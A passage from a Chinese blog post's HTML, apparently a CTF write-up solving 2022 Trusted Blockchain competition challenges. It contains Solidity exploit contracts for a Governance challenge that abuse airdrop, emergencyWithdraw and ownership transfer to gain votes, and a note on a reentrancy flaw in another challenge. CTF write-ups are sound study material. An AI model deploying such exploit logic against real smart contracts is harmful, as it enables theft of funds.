class_">Governance</span>(_gover);</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getAir</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        <span class="keyword">for</span> (uint i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;</span><br><span class="line">            master.<span class="title function_">airdorp</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getOwner</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        master.<span class="title function_">transferOwnership</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">vode</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        gover.<span class="title function_">vote</span>(owner);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setHelpers</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        <span class="keyword">for</span>(uint i=<span class="number">0</span>;i&lt;helpers.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            helpers[i]=<span class="title function_">address</span>(<span class="keyword">new</span> <span class="title function_">helper</span>(<span class="title function_">address</span>(master),<span class="title function_">address</span>(gover)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getBalance</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        <span class="keyword">for</span>(uint i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;</span><br><span class="line">            master.<span class="title function_">emergencyWithdraw</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferd</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        master.<span class="title function_">approve</span>(<span class="title function_">address</span>(master),master.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">        master.<span class="title function_">deposit</span>(<span class="number">0</span>,master.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getVote</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        master.<span class="title function_">transfer</span>(helpers[<span class="number">0</span>],<span class="number">10000000</span>);</span><br><span class="line">        <span class="title function_">helper</span>(helpers[<span class="number">0</span>]).<span class="title function_">getOwner</span>();</span><br><span class="line">        <span class="title function_">helper</span>(helpers[<span class="number">0</span>]).<span class="title function_">vode</span>(owner);</span><br><span class="line">        <span class="keyword">for</span> (uint i=<span class="number">0</span>;i&lt;helpers.<span class="property">length</span>-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="title function_">helper</span>(helpers[i]).<span class="title function_">transferd</span>(helpers[i+<span class="number">1</span>]);</span><br><span class="line">            <span class="title function_">helper</span>(helpers[i+<span class="number">1</span>]).<span class="title function_">getOwner</span>();</span><br><span class="line">            <span class="title function_">helper</span>(helpers[i+<span class="number">1</span>]).<span class="title function_">vode</span>(owner);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">helper</span>(helpers[<span class="number">6</span>]).<span class="title function_">transferd</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract helper&#123;</span><br><span class="line">    <span class="title class_">MasterChef</span> master;</span><br><span class="line">    <span class="title class_">Governance</span> gover;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _master,address _gover</span>)public&#123;</span><br><span class="line">        master = <span class="title class_">MasterChef</span>(_master);</span><br><span class="line">        gover = <span class="title class_">Governance</span>(_gover);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getOwner</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        master.<span class="title function_">transferOwnership</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">vode</span>(<span class="params">address _addr</span>)public&#123;</span><br><span class="line">        gover.<span class="title function_">vote</span>(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferd</span>(<span class="params">address _addr</span>)public&#123;</span><br><span class="line">        master.<span class="title function_">transfer</span>(_addr,<span class="number">10000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>依次调用getair,transferd,十次getbalance，getOwner,vode,setHelper,getVote函数，即可完成攻击。<br><img src="https://img-blog.csdnimg.cn/9b724f632b764c65bcda4e0b8e3c3141.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/418f5f802f6b42189f31f852e4982831.png" alt="在这里插入图片描述"></p>
+<h1 id="EverytingIsArt"><a href="#EverytingIsArt" class="headerlink" title="EverytingIsArt"></a>EverytingIsArt</h1><h2 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h2><p><img src="https://img-blog.csdnimg.cn/a0a0abac89c5489f834628e7c3bd8995.png" alt="在这里插入图片描述"><br>题目要求我们balance等于288.<br>这个题令我出乎意料，我以为最后一题应该会是最难的一题，没想到是最简单的一题。<br><img src="https://img-blog.csdnimg.cn/9bc7f0d075f040c5ba7193a3c1018d9e.png" alt="在这里插入图片描述"><br>直接在该函数中传入288即可。</p>
+<p>除了这种解决方法，另两个关于hope的函数还存在重入问题，即先进行mint后改变状态变量，按理来说同样可以达成条件，但一旦重入次数超过107，就会发生gas费超标的问题，两个函数分别重入107次也达不到288，但也同样是一个漏洞。</p>
+<h2 id="攻击-8"><a href="#攻击-8" class="headerlink" title="攻击"></a>攻击</h2><p>直接在becomeAnArtist中输入288，即可完成攻击。<br><img src="https://img-blog.csdnimg.cn/e82cafa3f58e4d4c88e8bcab5ed55102.png" alt="在这里插入图片描述"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>lucifer
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/12/01/2022%E4%B8%AD%E5%9B%BD%E5%8F%AF%E4%BF%A1%E5%8C%BA%E5%9D%97%E9%93%BE%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E8%B5%9B%E9%A2%98%E5%85%A8%E8%A7%A3/" title="2022中国可信区块链大赛初赛赛题全解">http://example.com/2022/12/01/2022中国可信区块链大赛初赛赛题全解/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/01/solidity%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/" rel="prev" title="solidity漏洞实践（二）">
+      <i class="fa fa-chevron-left"></i> solidity漏洞实践（二）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TrusterLenderPool"><span class="nav-number">1.</span> <span class="nav-text">TrusterLenderPool</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SVip"><span class="nav-number">2.</span> <span class="nav-text">SVip</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">2.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Merkle"><span class="nav-number">3.</span> <span class="nav-text">Merkle</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-2"><span class="nav-number">3.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#OwnerBuy"><span class="nav-number">4.</span> <span class="nav-text">OwnerBuy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-number">4.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-3"><span class="nav-number">4.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LostAssets"><span class="nav-number">5.</span> <span class="nav-text">LostAssets</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="nav-number">5.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-4"><span class="nav-number">5.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Storage1"><span class="nav-number">6.</span> <span class="nav-text">Storage1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-5"><span class="nav-number">6.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-5"><span class="nav-number">6.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FlashLoanMain"><span class="nav-number">7.</span> <span class="nav-text">FlashLoanMain</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-6"><span class="nav-number">7.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-6"><span class="nav-number">7.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Governance"><span class="nav-number">8.</span> <span class="nav-text">Governance</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-7"><span class="nav-number">8.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-7"><span class="nav-number">8.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EverytingIsArt"><span class="nav-number">9.</span> <span class="nav-text">EverytingIsArt</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-8"><span class="nav-number">9.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-8"><span class="nav-number">9.2.</span> <span class="nav-text">攻击</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lucifer</p>
+  <div class="site-description" itemprop="description">我的老婆严菡是猪</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lucifer</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">190k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:53</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
